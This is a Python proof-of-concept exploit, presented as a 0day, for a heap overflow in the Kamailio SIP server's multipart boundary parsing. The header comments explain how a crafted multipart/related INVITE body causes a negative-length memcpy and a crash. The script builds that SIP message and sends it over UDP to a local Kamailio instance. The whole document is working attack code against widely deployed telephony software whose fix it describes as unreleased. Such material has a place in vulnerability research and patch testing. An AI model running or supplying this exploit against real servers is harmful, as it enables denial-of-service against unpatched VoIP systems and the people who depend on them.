#!/usr/bin/env python3
# kamailio check_boundaries() heap overflow — 0day PoC (all releases <= 6.1.3, fix d7a7f22 unreleased)
# Trigger: multipart/related (NOT mixed) so set_body_multipart() proceeds and sets
# FL_BODY_MULTIPART; body "--X--X\r\n" -> two boundary matches on one line ->
# t = next - (this + line_len) < 0 -> memcpy(pb, src, (size_t)-5) -> SIGSEGV
import socket

BOUNDARY = "X"
BODY = b"--X--X\r\n"
msg = (
    "INVITE sip:bob@127.0.0.1:5099 SIP/2.0\r\n"
    "Via: SIP/2.0/UDP 127.0.0.1:5061;branch=z9hG4bK-1;rport\r\n"
    "Max-Forwards: 70\r\n"
    "From: <sip:alice@127.0.0.1>;tag=1\r\n"
    "To: <sip:bob@127.0.0.1>\r\n"
    "Call-ID: 1234@127.0.0.1\r\n"
    "CSeq: 1 INVITE\r\n"
    "Contact: <sip:alice@127.0.0.1:5061>\r\n"
    + "Content-Type: multipart/related;boundary=%s\r\n" % BOUNDARY
    + "Content-Length: %d\r\n\r\n" % len(BODY)
).encode() + BODY
print(f"[*] sending {len(msg)}B trigger")
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(msg, ("127.0.0.1", 5060))
